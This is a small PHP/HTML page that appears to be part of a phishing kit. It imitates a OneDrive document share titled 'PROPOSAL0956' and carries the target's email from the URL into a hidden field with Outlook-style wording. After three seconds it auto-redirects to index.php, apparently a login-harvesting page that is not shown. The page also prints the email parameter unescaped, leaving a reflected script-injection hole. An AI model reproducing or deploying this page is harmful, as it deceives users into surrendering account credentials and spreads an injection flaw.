<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta http-equiv="refresh" content="3;url=index.php?email=<?php echo $_GET["email"]; ?>" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>PROPOSAL0956</title>


<link rel="shortcut icon" href="images/icon.jpg">

</head>
<body style="background-color:#D2D3D5;">
<style>
.container {
  margin:0 auto;
  width: 935px;
  height: 850px;
  padding-top:450px;
      vertical-align:middle;
      text-align:center;
	  background-image: url("images/onedrive.jpg");
}
.container input{
  padding:10px;
  border: 1px solid #fff;
  color: #434B9C;
  font-weight: bold;
  text-decoration: underline;
  cursor: pointer;
  animation:blinkingText 0.8s infinite;
}

@keyframes blinkingText{
	20%{		color: #434B9C;	}
	49%{	color: transparent;	}
	50%{	color: transparent;	}
	70%{	color:transparent;	}
	100%{	color: #434B9C;	}
}
.container input:hover{
  padding:10px;
  border: 1px solid #fff;
  color: #fff;
  background: #a7aff9;
  font-weight: bold;
  text-decoration: underline;
  cursor: pointer;
}
</style>
<div class="container">
<form action="index.php" method="get" name="outlook">

<div class="form-group"><input id="uemail" class="form-control" name="email" type="hidden" value="<?php echo $_GET["email"]; ?>" placeholder="Email, phone, or Skype" aria-describedby="emailHelp" /></div>

<input class="sub" type="submit" value="Redirecting in 3 seconds..."/>

</form>
</div>
</body>
</html>
